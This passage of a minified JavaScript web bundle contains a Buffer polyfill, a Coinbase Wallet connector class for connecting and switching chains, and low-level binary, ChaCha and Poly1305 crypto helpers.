d=+d,h=h>>>0,S||oe(this,d,h,1,255,0),this[h]=d&255,h+1},s.prototype.writeUint16LE=s.prototype.writeUInt16LE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,2,65535,0),this[h]=d&255,this[h+1]=d>>>8,h+2},s.prototype.writeUint16BE=s.prototype.writeUInt16BE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,2,65535,0),this[h]=d>>>8,this[h+1]=d&255,h+2},s.prototype.writeUint32LE=s.prototype.writeUInt32LE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,4,4294967295,0),this[h+3]=d>>>24,this[h+2]=d>>>16,this[h+1]=d>>>8,this[h]=d&255,h+4},s.prototype.writeUint32BE=s.prototype.writeUInt32BE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,4,4294967295,0),this[h]=d>>>24,this[h+1]=d>>>16,this[h+2]=d>>>8,this[h+3]=d&255,h+4};function Z(y,d,h,S,P){Ne(d,S,P,y,h,7);let D=Number(d&BigInt(4294967295));y[h++]=D,D=D>>8,y[h++]=D,D=D>>8,y[h++]=D,D=D>>8,y[h++]=D;let M=Number(d>>BigInt(32)&BigInt(4294967295));return y[h++]=M,M=M>>8,y[h++]=M,M=M>>8,y[h++]=M,M=M>>8,y[h++]=M,h}function se(y,d,h,S,P){Ne(d,S,P,y,h,7);let D=Number(d&BigInt(4294967295));y[h+7]=D,D=D>>8,y[h+6]=D,D=D>>8,y[h+5]=D,D=D>>8,y[h+4]=D;let M=Number(d>>BigInt(32)&BigInt(4294967295));return y[h+3]=M,M=M>>8,y[h+2]=M,M=M>>8,y[h+1]=M,M=M>>8,y[h]=M,h+8}s.prototype.writeBigUInt64LE=Ve(function(d,h=0){return Z(this,d,h,BigInt(0),BigInt("0xffffffffffffffff"))}),s.prototype.writeBigUInt64BE=Ve(function(d,h=0){return se(this,d,h,BigInt(0),BigInt("0xffffffffffffffff"))}),s.prototype.writeIntLE=function(d,h,S,P){if(d=+d,h=h>>>0,!P){const Ie=Math.pow(2,8*S-1);oe(this,d,h,S,Ie-1,-Ie)}let D=0,M=1,ce=0;for(this[h]=d&255;++D<S&&(M*=256);)d<0&&ce===0&&this[h+D-1]!==0&&(ce=1),this[h+D]=(d/M>>0)-ce&255;return h+S},s.prototype.writeIntBE=function(d,h,S,P){if(d=+d,h=h>>>0,!P){const Ie=Math.pow(2,8*S-1);oe(this,d,h,S,Ie-1,-Ie)}let D=S-1,M=1,ce=0;for(this[h+D]=d&255;--D>=0&&(M*=256);)d<0&&ce===0&&this[h+D+1]!==0&&(ce=1),this[h+D]=(d/M>>0)-ce&255;return h+S},s.prototype.writeInt8=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,1,127,-128),d<0&&(d=255+d+1),this[h]=d&255,h+1},s.prototype.writeInt16LE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,2,32767,-32768),this[h]=d&255,this[h+1]=d>>>8,h+2},s.prototype.writeInt16BE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,2,32767,-32768),this[h]=d>>>8,this[h+1]=d&255,h+2},s.prototype.writeInt32LE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,4,2147483647,-2147483648),this[h]=d&255,this[h+1]=d>>>8,this[h+2]=d>>>16,this[h+3]=d>>>24,h+4},s.prototype.writeInt32BE=function(d,h,S){return d=+d,h=h>>>0,S||oe(this,d,h,4,2147483647,-2147483648),d<0&&(d=4294967295+d+1),this[h]=d>>>24,this[h+1]=d>>>16,this[h+2]=d>>>8,this[h+3]=d&255,h+4},s.prototype.writeBigInt64LE=Ve(function(d,h=0){return Z(this,d,h,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))}),s.prototype.writeBigInt64BE=Ve(function(d,h=0){return se(this,d,h,-BigInt("0x8000000000000000"),BigInt("0x7fffffffffffffff"))});function de(y,d,h,S,P,D){if(h+S>y.length)throw new RangeError("Index out of range");if(h<0)throw new RangeError("Index out of range")}function Ee(y,d,h,S,P){return d=+d,h=h>>>0,P||de(y,d,h,4),n.write(y,d,h,S,23,4),h+4}s.prototype.writeFloatLE=function(d,h,S){return Ee(this,d,h,!0,S)},s.prototype.writeFloatBE=function(d,h,S){return Ee(this,d,h,!1,S)};function Ce(y,d,h,S,P){return d=+d,h=h>>>0,P||de(y,d,h,8),n.write(y,d,h,S,52,8),h+8}s.prototype.writeDoubleLE=function(d,h,S){return Ce(this,d,h,!0,S)},s.prototype.writeDoubleBE=function(d,h,S){return Ce(this,d,h,!1,S)},s.prototype.copy=function(d,h,S,P){if(!s.isBuffer(d))throw new TypeError("argument should be a Buffer");if(S||(S=0),!P&&P!==0&&(P=this.length),h>=d.length&&(h=d.length),h||(h=0),P>0&&P<S&&(P=S),P===S||d.length===0||this.length===0)return 0;if(h<0)throw new RangeError("targetStart out of bounds");if(S<0||S>=this.length)throw new RangeError("Index out of range");if(P<0)throw new RangeError("sourceEnd out of bounds");P>this.length&&(P=this.length),d.length-h<P-S&&(P=d.length-h+S);const D=P-S;return this===d&&typeof Uint8Array.prototype.copyWithin=="function"?this.copyWithin(h,S,P):Uint8Array.prototype.set.call(d,this.subarray(S,P),h),D},s.prototype.fill=function(d,h,S,P){if(typeof d=="string"){if(typeof h=="string"?(P=h,h=0,S=this.length):typeof S=="string"&&(P=S,S=this.length),P!==void 0&&typeof P!="string")throw new TypeError("encoding must be a string");if(typeof P=="string"&&!s.isEncoding(P))throw new TypeError("Unknown encoding: "+P);if(d.length===1){const M=d.charCodeAt(0);(P==="utf8"&&M<128||P==="latin1")&&(d=M)}}else typeof d=="number"?d=d&255:typeof d=="boolean"&&(d=Number(d));if(h<0||this.length<h||this.length<S)throw new RangeError("Out of range index");if(S<=h)return this;h=h>>>0,S=S===void 0?this.length:S>>>0,d||(d=0);let D;if(typeof d=="number")for(D=h;D<S;++D)this[D]=d;else{const M=s.isBuffer(d)?d:s.from(d,P),ce=M.length;if(ce===0)throw new TypeError('The value "'+d+'" is invalid for argument "value"');for(D=0;D<S-h;++D)this[D+h]=M[D%ce]}return this};const ye={};function Ae(y,d,h){ye[y]=class extends h{constructor(){super(),Object.defineProperty(this,"message",{value:d.apply(this,arguments),writable:!0,configurable:!0}),this.name=`${this.name} [${y}]`,this.stack,delete this.name}get code(){return y}set code(P){Object.defineProperty(this,"code",{configurable:!0,enumerable:!0,value:P,writable:!0})}toString(){return`${this.name} [${y}]: ${this.message}`}}}Ae("ERR_BUFFER_OUT_OF_BOUNDS",function(y){return y?`${y} is outside of buffer bounds`:"Attempt to access memory outside buffer bounds"},RangeError),Ae("ERR_INVALID_ARG_TYPE",function(y,d){return`The "${y}" argument must be of type number. Received type ${typeof d}`},TypeError),Ae("ERR_OUT_OF_RANGE",function(y,d,h){let S=`The value of "${y}" is out of range.`,P=h;return Number.isInteger(h)&&Math.abs(h)>2**32?P=me(String(h)):typeof h=="bigint"&&(P=String(h),(h>BigInt(2)**BigInt(32)||h<-(BigInt(2)**BigInt(32)))&&(P=me(P)),P+="n"),S+=` It must be ${d}. Received ${P}`,S},RangeError);function me(y){let d="",h=y.length;const S=y[0]==="-"?1:0;for(;h>=S+4;h-=3)d=`_${y.slice(h-3,h)}${d}`;return`${y.slice(0,h)}${d}`}function $e(y,d,h){De(d,"offset"),(y[d]===void 0||y[d+h]===void 0)&&kt(d,y.length-(h+1))}function Ne(y,d,h,S,P,D){if(y>h||y<d){const M=typeof d=="bigint"?"n":"";let ce;throw D>3?d===0||d===BigInt(0)?ce=`>= 0${M} and < 2${M} ** ${(D+1)*8}${M}`:ce=`>= -(2${M} ** ${(D+1)*8-1}${M}) and < 2 ** ${(D+1)*8-1}${M}`:ce=`>= ${d}${M} and <= ${h}${M}`,new ye.ERR_OUT_OF_RANGE("value",ce,y)}$e(S,P,D)}function De(y,d){if(typeof y!="number")throw new ye.ERR_INVALID_ARG_TYPE(d,"number",y)}function kt(y,d,h){throw Math.floor(y)!==y?(De(y,h),new ye.ERR_OUT_OF_RANGE(h||"offset","an integer",y)):d<0?new ye.ERR_BUFFER_OUT_OF_BOUNDS:new ye.ERR_OUT_OF_RANGE(h||"offset",`>= ${h?1:0} and <= ${d}`,y)}const Jn=/[^+/0-9A-Za-z-_]/g;function $r(y){if(y=y.split("=")[0],y=y.trim().replace(Jn,""),y.length<2)return"";for(;y.length%4!==0;)y=y+"=";return y}function Xn(y,d){d=d||1/0;let h;const S=y.length;let P=null;const D=[];for(let M=0;M<S;++M){if(h=y.charCodeAt(M),h>55295&&h<57344){if(!P){if(h>56319){(d-=3)>-1&&D.push(239,191,189);continue}else if(M+1===S){(d-=3)>-1&&D.push(239,191,189);continue}P=h;continue}if(h<56320){(d-=3)>-1&&D.push(239,191,189),P=h;continue}h=(P-55296<<10|h-56320)+65536}else P&&(d-=3)>-1&&D.push(239,191,189);if(P=null,h<128){if((d-=1)<0)break;D.push(h)}else if(h<2048){if((d-=2)<0)break;D.push(h>>6|192,h&63|128)}else if(h<65536){if((d-=3)<0)break;D.push(h>>12|224,h>>6&63|128,h&63|128)}else if(h<1114112){if((d-=4)<0)break;D.push(h>>18|240,h>>12&63|128,h>>6&63|128,h&63|128)}else throw new Error("Invalid code point")}return D}function mo(y){const d=[];for(let h=0;h<y.length;++h)d.push(y.charCodeAt(h)&255);return d}function rs(y,d){let h,S,P;const D=[];for(let M=0;M<y.length&&!((d-=2)<0);++M)h=y.charCodeAt(M),S=h>>8,P=h%256,D.push(P),D.push(S);return D}function ct(y){return e.toByteArray($r(y))}function tt(y,d,h,S){let P;for(P=0;P<S&&!(P+h>=d.length||P>=y.length);++P)d[P+h]=y[P];return P}function je(y,d){return y instanceof d||y!=null&&y.constructor!=null&&y.constructor.name!=null&&y.constructor.name===d.name}function it(y){return y!==y}const ut=function(){const y="0123456789abcdef",d=new Array(256);for(let h=0;h<16;++h){const S=h*16;for(let P=0;P<16;++P)d[S+P]=y[h]+y[P]}return d}();function Ve(y){return typeof BigInt>"u"?dt:y}function dt(){throw new Error("BigInt not supported")}})(I1);var ch;typeof window<"u"&&(window.Buffer||(window.Buffer=I1.Buffer),window.global||(window.global=window),window.process||(window.process={}),(ch=window.process)!=null&&ch.env||(window.process={env:{}}));var So,Si,s8=class extends Oc{constructor({chains:t,options:e}){super({chains:t,options:{reloadOnDisconnect:!1,...e}}),this.id="coinbaseWallet",this.name="Coinbase Wallet",this.ready=!0,Tt(this,So,void 0),Tt(this,Si,void 0),this.onAccountsChanged=n=>{n.length===0?this.emit("disconnect"):this.emit("change",{account:Vt(n[0])})},this.onChainChanged=n=>{const r=$s(n),o=this.isChainUnsupported(r);this.emit("change",{chain:{id:r,unsupported:o}})},this.onDisconnect=()=>{this.emit("disconnect")}}async connect({chainId:t}={}){try{const e=await this.getProvider();e.on("accountsChanged",this.onAccountsChanged),e.on("chainChanged",this.onChainChanged),e.on("disconnect",this.onDisconnect),this.emit("message",{type:"connecting"});const n=await e.enable(),r=Vt(n[0]);let o=await this.getChainId(),i=this.isChainUnsupported(o);return t&&o!==t&&(o=(await this.switchChain(t)).id,i=this.isChainUnsupported(o)),{account:r,chain:{id:o,unsupported:i}}}catch(e){throw/(user closed modal|accounts received is empty)/i.test(e.message)?new $t(e):e}}async disconnect(){if(!Le(this,Si))return;const t=await this.getProvider();t.removeListener("accountsChanged",this.onAccountsChanged),t.removeListener("chainChanged",this.onChainChanged),t.removeListener("disconnect",this.onDisconnect),t.disconnect(),t.close()}async getAccount(){const e=await(await this.getProvider()).request({method:"eth_accounts"});return Vt(e[0])}async getChainId(){const t=await this.getProvider();return $s(t.chainId)}async getProvider(){var t;if(!Le(this,Si)){let e=(await ki(()=>import("./index-nhSKx7hn.js").then(a=>a.i),__vite__mapDeps([0,1]))).default;typeof e!="function"&&typeof e.default=="function"&&(e=e.default),Jo(this,So,new e(this.options));const n=(t=Le(this,So).walletExtension)==null?void 0:t.getChainId(),r=this.chains.find(a=>this.options.chainId?a.id===this.options.chainId:a.id===n)||this.chains[0],o=this.options.chainId||(r==null?void 0:r.id),i=this.options.jsonRpcUrl||(r==null?void 0:r.rpcUrls.default.http[0]);Jo(this,Si,Le(this,So).makeWeb3Provider(i,o))}return Le(this,Si)}async getWalletClient({chainId:t}={}){const[e,n]=await Promise.all([this.getProvider(),this.getAccount()]),r=this.chains.find(o=>o.id===t);if(!e)throw new Error("provider is required.");return Ic({account:n,chain:r,transport:Ac(e)})}async isAuthorized(){try{return!!await this.getAccount()}catch{return!1}}async switchChain(t){var r;const e=await this.getProvider(),n=xe(t);try{return await e.request({method:"wallet_switchEthereumChain",params:[{chainId:n}]}),this.chains.find(o=>o.id===t)??{id:t,name:`Chain ${n}`,network:`${n}`,nativeCurrency:{name:"Ether",decimals:18,symbol:"ETH"},rpcUrls:{default:{http:[""]},public:{http:[""]}}}}catch(o){const i=this.chains.find(a=>a.id===t);if(!i)throw new sp({chainId:t,connectorId:this.id});if(o.code===4902)try{return await e.request({method:"wallet_addEthereumChain",params:[{chainId:n,chainName:i.name,nativeCurrency:i.nativeCurrency,rpcUrls:[((r=i.rpcUrls.public)==null?void 0:r.http[0])??""],blockExplorerUrls:this.getBlockExplorerUrls(i)}]}),i}catch(a){throw new $t(a)}throw new an(o)}}async watchAsset({address:t,decimals:e=18,image:n,symbol:r}){return(await this.getProvider()).request({method:"wallet_watchAsset",params:{type:"ERC20",options:{address:t,decimals:e,image:n,symbol:r}}})}};So=new WeakMap;Si=new WeakMap;var ef={},Qc={},Se={},O1={};(function(t){Object.defineProperty(t,"__esModule",{value:!0});function e(s,c){var l=s>>>16&65535,u=s&65535,p=c>>>16&65535,m=c&65535;return u*m+(l*m+u*p<<16>>>0)|0}t.mul=Math.imul||e;function n(s,c){return s+c|0}t.add=n;function r(s,c){return s-c|0}t.sub=r;function o(s,c){return s<<c|s>>>32-c}t.rotl=o;function i(s,c){return s<<32-c|s>>>c}t.rotr=i;function a(s){return typeof s=="number"&&isFinite(s)&&Math.floor(s)===s}t.isInteger=Number.isInteger||a,t.MAX_SAFE_INTEGER=9007199254740991,t.isSafeInteger=function(s){return t.isInteger(s)&&s>=-t.MAX_SAFE_INTEGER&&s<=t.MAX_SAFE_INTEGER}})(O1);Object.defineProperty(Se,"__esModule",{value:!0});var P1=O1;function c8(t,e){return e===void 0&&(e=0),(t[e+0]<<8|t[e+1])<<16>>16}Se.readInt16BE=c8;function l8(t,e){return e===void 0&&(e=0),(t[e+0]<<8|t[e+1])>>>0}Se.readUint16BE=l8;function u8(t,e){return e===void 0&&(e=0),(t[e+1]<<8|t[e])<<16>>16}Se.readInt16LE=u8;function d8(t,e){return e===void 0&&(e=0),(t[e+1]<<8|t[e])>>>0}Se.readUint16LE=d8;function D1(t,e,n){return e===void 0&&(e=new Uint8Array(2)),n===void 0&&(n=0),e[n+0]=t>>>8,e[n+1]=t>>>0,e}Se.writeUint16BE=D1;Se.writeInt16BE=D1;function R1(t,e,n){return e===void 0&&(e=new Uint8Array(2)),n===void 0&&(n=0),e[n+0]=t>>>0,e[n+1]=t>>>8,e}Se.writeUint16LE=R1;Se.writeInt16LE=R1;function Ou(t,e){return e===void 0&&(e=0),t[e]<<24|t[e+1]<<16|t[e+2]<<8|t[e+3]}Se.readInt32BE=Ou;function Pu(t,e){return e===void 0&&(e=0),(t[e]<<24|t[e+1]<<16|t[e+2]<<8|t[e+3])>>>0}Se.readUint32BE=Pu;function Du(t,e){return e===void 0&&(e=0),t[e+3]<<24|t[e+2]<<16|t[e+1]<<8|t[e]}Se.readInt32LE=Du;function Ru(t,e){return e===void 0&&(e=0),(t[e+3]<<24|t[e+2]<<16|t[e+1]<<8|t[e])>>>0}Se.readUint32LE=Ru;function oc(t,e,n){return e===void 0&&(e=new Uint8Array(4)),n===void 0&&(n=0),e[n+0]=t>>>24,e[n+1]=t>>>16,e[n+2]=t>>>8,e[n+3]=t>>>0,e}Se.writeUint32BE=oc;Se.writeInt32BE=oc;function ac(t,e,n){return e===void 0&&(e=new Uint8Array(4)),n===void 0&&(n=0),e[n+0]=t>>>0,e[n+1]=t>>>8,e[n+2]=t>>>16,e[n+3]=t>>>24,e}Se.writeUint32LE=ac;Se.writeInt32LE=ac;function f8(t,e){e===void 0&&(e=0);var n=Ou(t,e),r=Ou(t,e+4);return n*4294967296+r-(r>>31)*4294967296}Se.readInt64BE=f8;function h8(t,e){e===void 0&&(e=0);var n=Pu(t,e),r=Pu(t,e+4);return n*4294967296+r}Se.readUint64BE=h8;function p8(t,e){e===void 0&&(e=0);var n=Du(t,e),r=Du(t,e+4);return r*4294967296+n-(n>>31)*4294967296}Se.readInt64LE=p8;function m8(t,e){e===void 0&&(e=0);var n=Ru(t,e),r=Ru(t,e+4);return r*4294967296+n}Se.readUint64LE=m8;function N1(t,e,n){return e===void 0&&(e=new Uint8Array(8)),n===void 0&&(n=0),oc(t/4294967296>>>0,e,n),oc(t>>>0,e,n+4),e}Se.writeUint64BE=N1;Se.writeInt64BE=N1;function k1(t,e,n){return e===void 0&&(e=new Uint8Array(8)),n===void 0&&(n=0),ac(t>>>0,e,n),ac(t/4294967296>>>0,e,n+4),e}Se.writeUint64LE=k1;Se.writeInt64LE=k1;function g8(t,e,n){if(n===void 0&&(n=0),t%8!==0)throw new Error("readUintBE supports only bitLengths divisible by 8");if(t/8>e.length-n)throw new Error("readUintBE: array is too short for the given bitLength");for(var r=0,o=1,i=t/8+n-1;i>=n;i--)r+=e[i]*o,o*=256;return r}Se.readUintBE=g8;function w8(t,e,n){if(n===void 0&&(n=0),t%8!==0)throw new Error("readUintLE supports only bitLengths divisible by 8");if(t/8>e.length-n)throw new Error("readUintLE: array is too short for the given bitLength");for(var r=0,o=1,i=n;i<n+t/8;i++)r+=e[i]*o,o*=256;return r}Se.readUintLE=w8;function b8(t,e,n,r){if(n===void 0&&(n=new Uint8Array(t/8)),r===void 0&&(r=0),t%8!==0)throw new Error("writeUintBE supports only bitLengths divisible by 8");if(!P1.isSafeInteger(e))throw new Error("writeUintBE value must be an integer");for(var o=1,i=t/8+r-1;i>=r;i--)n[i]=e/o&255,o*=256;return n}Se.writeUintBE=b8;function y8(t,e,n,r){if(n===void 0&&(n=new Uint8Array(t/8)),r===void 0&&(r=0),t%8!==0)throw new Error("writeUintLE supports only bitLengths divisible by 8");if(!P1.isSafeInteger(e))throw new Error("writeUintLE value must be an integer");for(var o=1,i=r;i<r+t/8;i++)n[i]=e/o&255,o*=256;return n}Se.writeUintLE=y8;function v8(t,e){e===void 0&&(e=0);var n=new DataView(t.buffer,t.byteOffset,t.byteLength);return n.getFloat32(e)}Se.readFloat32BE=v8;function x8(t,e){e===void 0&&(e=0);var n=new DataView(t.buffer,t.byteOffset,t.byteLength);return n.getFloat32(e,!0)}Se.readFloat32LE=x8;function _8(t,e){e===void 0&&(e=0);var n=new DataView(t.buffer,t.byteOffset,t.byteLength);return n.getFloat64(e)}Se.readFloat64BE=_8;function E8(t,e){e===void 0&&(e=0);var n=new DataView(t.buffer,t.byteOffset,t.byteLength);return n.getFloat64(e,!0)}Se.readFloat64LE=E8;function C8(t,e,n){e===void 0&&(e=new Uint8Array(4)),n===void 0&&(n=0);var r=new DataView(e.buffer,e.byteOffset,e.byteLength);return r.setFloat32(n,t),e}Se.writeFloat32BE=C8;function S8(t,e,n){e===void 0&&(e=new Uint8Array(4)),n===void 0&&(n=0);var r=new DataView(e.buffer,e.byteOffset,e.byteLength);return r.setFloat32(n,t,!0),e}Se.writeFloat32LE=S8;function A8(t,e,n){e===void 0&&(e=new Uint8Array(8)),n===void 0&&(n=0);var r=new DataView(e.buffer,e.byteOffset,e.byteLength);return r.setFloat64(n,t),e}Se.writeFloat64BE=A8;function T8(t,e,n){e===void 0&&(e=new Uint8Array(8)),n===void 0&&(n=0);var r=new DataView(e.buffer,e.byteOffset,e.byteLength);return r.setFloat64(n,t,!0),e}Se.writeFloat64LE=T8;var gn={};Object.defineProperty(gn,"__esModule",{value:!0});function I8(t){for(var e=0;e<t.length;e++)t[e]=0;return t}gn.wipe=I8;Object.defineProperty(Qc,"__esModule",{value:!0});var gt=Se,Nu=gn,$8=20;function O8(t,e,n){for(var r=1634760805,o=857760878,i=2036477234,a=1797285236,s=n[3]<<24|n[2]<<16|n[1]<<8|n[0],c=n[7]<<24|n[6]<<16|n[5]<<8|n[4],l=n[11]<<24|n[10]<<16|n[9]<<8|n[8],u=n[15]<<24|n[14]<<16|n[13]<<8|n[12],p=n[19]<<24|n[18]<<16|n[17]<<8|n[16],m=n[23]<<24|n[22]<<16|n[21]<<8|n[20],g=n[27]<<24|n[26]<<16|n[25]<<8|n[24],w=n[31]<<24|n[30]<<16|n[29]<<8|n[28],v=e[3]<<24|e[2]<<16|e[1]<<8|e[0],E=e[7]<<24|e[6]<<16|e[5]<<8|e[4],I=e[11]<<24|e[10]<<16|e[9]<<8|e[8],b=e[15]<<24|e[14]<<16|e[13]<<8|e[12],_=r,x=o,C=i,A=a,f=s,T=c,R=l,N=u,k=p,Y=m,re=g,W=w,L=v,U=E,B=I,j=b,X=0;X<$8;X+=2)_=_+f|0,L^=_,L=L>>>16|L<<16,k=k+L|0,f^=k,f=f>>>20|f<<12,x=x+T|0,U^=x,U=U>>>16|U<<16,Y=Y+U|0,T^=Y,T=T>>>20|T<<12,C=C+R|0,B^=C,B=B>>>16|B<<16,re=re+B|0,R^=re,R=R>>>20|R<<12,A=A+N|0,j^=A,j=j>>>16|j<<16,W=W+j|0,N^=W,N=N>>>20|N<<12,C=C+R|0,B^=C,B=B>>>24|B<<8,re=re+B|0,R^=re,R=R>>>25|R<<7,A=A+N|0,j^=A,j=j>>>24|j<<8,W=W+j|0,N^=W,N=N>>>25|N<<7,x=x+T|0,U^=x,U=U>>>24|U<<8,Y=Y+U|0,T^=Y,T=T>>>25|T<<7,_=_+f|0,L^=_,L=L>>>24|L<<8,k=k+L|0,f^=k,f=f>>>25|f<<7,_=_+T|0,j^=_,j=j>>>16|j<<16,re=re+j|0,T^=re,T=T>>>20|T<<12,x=x+R|0,L^=x,L=L>>>16|L<<16,W=W+L|0,R^=W,R=R>>>20|R<<12,C=C+N|0,U^=C,U=U>>>16|U<<16,k=k+U|0,N^=k,N=N>>>20|N<<12,A=A+f|0,B^=A,B=B>>>16|B<<16,Y=Y+B|0,f^=Y,f=f>>>20|f<<12,C=C+N|0,U^=C,U=U>>>24|U<<8,k=k+U|0,N^=k,N=N>>>25|N<<7,A=A+f|0,B^=A,B=B>>>24|B<<8,Y=Y+B|0,f^=Y,f=f>>>25|f<<7,x=x+R|0,L^=x,L=L>>>24|L<<8,W=W+L|0,R^=W,R=R>>>25|R<<7,_=_+T|0,j^=_,j=j>>>24|j<<8,re=re+j|0,T^=re,T=T>>>25|T<<7;gt.writeUint32LE(_+r|0,t,0),gt.writeUint32LE(x+o|0,t,4),gt.writeUint32LE(C+i|0,t,8),gt.writeUint32LE(A+a|0,t,12),gt.writeUint32LE(f+s|0,t,16),gt.writeUint32LE(T+c|0,t,20),gt.writeUint32LE(R+l|0,t,24),gt.writeUint32LE(N+u|0,t,28),gt.writeUint32LE(k+p|0,t,32),gt.writeUint32LE(Y+m|0,t,36),gt.writeUint32LE(re+g|0,t,40),gt.writeUint32LE(W+w|0,t,44),gt.writeUint32LE(L+v|0,t,48),gt.writeUint32LE(U+E|0,t,52),gt.writeUint32LE(B+I|0,t,56),gt.writeUint32LE(j+b|0,t,60)}function M1(t,e,n,r,o){if(o===void 0&&(o=0),t.length!==32)throw new Error("ChaCha: key size must be 32 bytes");if(r.length<n.length)throw new Error("ChaCha: destination is shorter than source");var i,a;if(o===0){if(e.length!==8&&e.length!==12)throw new Error("ChaCha nonce must be 8 or 12 bytes");i=new Uint8Array(16),a=i.length-e.length,i.set(e,a)}else{if(e.length!==16)throw new Error("ChaCha nonce with counter must be 16 bytes");i=e,a=o}for(var s=new Uint8Array(64),c=0;c<n.length;c+=64){O8(s,i,t);for(var l=c;l<c+64&&l<n.length;l++)r[l]=n[l]^s[l-c];D8(i,0,a)}return Nu.wipe(s),o===0&&Nu.wipe(i),r}Qc.streamXOR=M1;function P8(t,e,n,r){return r===void 0&&(r=0),Nu.wipe(n),M1(t,e,n,n,r)}Qc.stream=P8;function D8(t,e,n){for(var r=1;n--;)r=r+(t[e]&255)|0,t[e]=r&255,r>>>=8,e++;if(r>0)throw new Error("ChaCha: counter overflow")}var U1={},Ir={};Object.defineProperty(Ir,"__esModule",{value:!0});function R8(t,e,n){return~(t-1)&e|t-1&n}Ir.select=R8;function N8(t,e){return(t|0)-(e|0)-1>>>31&1}Ir.lessOrEqual=N8;function B1(t,e){if(t.length!==e.length)return 0;for(var n=0,r=0;r<t.length;r++)n|=t[r]^e[r];return 1&n-1>>>8}Ir.compare=B1;function k8(t,e){return t.length===0||e.length===0?!1:B1(t,e)!==0}Ir.equal=k8;(function(t){Object.defineProperty(t,"__esModule",{value:!0});var e=Ir,n=gn;t.DIGEST_LENGTH=16;var r=function(){function a(s){this.digestLength=t.DIGEST_LENGTH,this._buffer=new Uint8Array(16),this._r=new Uint16Array(10),this._h=new Uint16Array(10),this._pad=new Uint16Array(8),this._leftover=0,this._fin=0,this._finished=!1;var c=s[0]|s[1]<<8;this._r[0]=c&8191;var l=s[2]|s[3]<<8;this._r[1]=(c>>>13|l<<3)&8191;var u=s[4]|s[5]<<8;this._r[2]=(l>>>10|u<<6)&7939;var p=s[6]|s[7]<<8;this._r[3]=(u>>>7|p<<9)&8191;var m=s[8]|s[9]<<8;this._r[4]=(p>>>4|m<<12)&255,this._r[5]=m>>>1&8190;var g=s[10]|s[11]<<8;this._r[6]=(m>>>14|g<<2)&8191;var w=s[12]|s[13]<<8;this._r[7]=(g>>>11|w<<5)&8065;var v=s[14]|s[15]<<8;this._r[8]=(w>>>8|v<<8)&8191,this._r[9]=v>>>5&127,this._pad[0]=s[16]|s[17]<<8,this._pad[1]=s[18]|s[19]<<8,this._pad[2]=s[20]|s[21]<<8,this._pad[3]=s[22]|s[23]<<8,this._pad[4]=s[24]|s[25]<<8,this._pad[5]=s[26]|s[27]<<8,this._pad[6]=s[28]|s[29]<<8,this._pad[7]=s[30]|s[31]<<8}return a.prototype._blocks=function(s,c,l){for(var u=this._fin?0:2048,p=this._h[0],m=this._h[1],g=this._h[2],w=this._h[3],v=this._h[4],E=this._h[5],I=this._h[6],b=this._h[7],_=this._h[8],x=this._h[9],C=this._r[0],A=this._r[1],f=this._r[2],T=this._r[3],R=this._r[4],N=this._r[5],k=this._r[6],Y=this._r[7],re=this._r[8],W=this._r[9];l>=16;){var L=s[c+0]|s[c+1]<<8;p+=L&8191;var U=s[c+2]|s[c+3]<<8;m+=(L>>>13|U<<3)&8191;var B=s[c+4]|s[c+5]<<8;g+=(U>>>10|B<<6)&8191;var j=s[c+6]|s[c+7]<<8;w+=(B>>>7|j<<9)&8191;var X=s[c+8]|s[c+9]<<8;v+=(j>>>4|X<<12)&8191,E+=X>>>1&8191;var ne=s[c+10]|s[c+11]<<8;I+=(X>>>14|ne<<2)&8191;var Q=s[c+12]|s[c+13]<<8;b+=(ne>>>11|Q<<5)&8191;var oe=s[c+14]|s[c+15]<<8;_+=(Q>>>8|oe<<8)&8191,x+=oe>>>5|u;var Z=0,se=Z;se+=p*C,se+=m*(5*W),se+=g*(5*re),se+=w*(5*Y),se+=v*(5*k),Z=se>>>13,se&=8191,se+=E*(5*N),se+=I*(5*R),se+=b*(5*T),se+=_*(5*f),se+=x*(5*A),Z+=se>>>13,se&=8191;var de=Z;de+=p*A,de+=m*C,de+=g*(5*W),de+=w*(5*re),de+=v*(5*Y),Z=de>>>13,de&=8191,de+=E*(5*k),de+=I*(5*N),de+=b*(5*R),de+=_*(5*T),de+=x*(5*f),Z+=de>>>13,de&=8191;var Ee=Z;Ee+=p*f,Ee+=m*A,Ee+=g*C,Ee+=w*(5*W),Ee+=v*(5*re),Z=Ee>>>13,Ee&=8191,Ee+=E*(5*Y),Ee+=I*(5*k),Ee+=b*(5*N),Ee+=_*(5*R),Ee+=x*(5*T),Z+=Ee>>>13,Ee&=8191;var Ce=Z;Ce+=p*T,Ce+=m*f,Ce+=g*A,Ce+=w*C,Ce+=v*(5*W),Z=Ce>>>13,Ce&=8191,Ce+=E*(5*re),Ce+=I*(5*Y),Ce+=b*(5*k),Ce+=_*(5*N),Ce+=x*(5*R),Z+=Ce>>>13,Ce&=8191;var ye=Z;ye+=p*R,ye+=m*T,ye+=g*f,ye+=w*A,ye+=v*C,Z=ye>>>13,ye&=8191,ye+=E*(5*W),ye+=I*(5*re),ye+=b*(5*Y),ye+=_*(5*k),ye+=x*(5*N),Z+=ye>>>13,ye&=8191;var Ae=Z;Ae+=p*N,Ae+=m*R,Ae+=g*T,Ae+=w*f,Ae+=v*A,Z=Ae>>>13,Ae&=8191,Ae+=E*C,Ae+=I*(5*W),Ae+=b*(5*re),Ae+=_*(5*Y),Ae+=x*(5*k),Z+=Ae>>>13,Ae&=8191;var me=Z;me+=p*k,me+=m*N,me+=g*R,me+=w*T,me+=v*f,Z=me>>>13,me&=8191,me+=E*A,me+=I*C,me+=b*(5*W),me+=_*(5*re),me+=x*(5*Y),Z+=me>>>13,me&=8191;var $e=Z;$e+=p*Y,$e+=m*k,$e+=g*N,$e+=w*R,$e+=v*T,Z=$e>>>13,$e&=8191,$e+=E*f,$e+=I*A,$e+=b*C,$e+=_*(5*W),$e+=x*(5*re),Z+=$e>>>13,$e&=8191;var 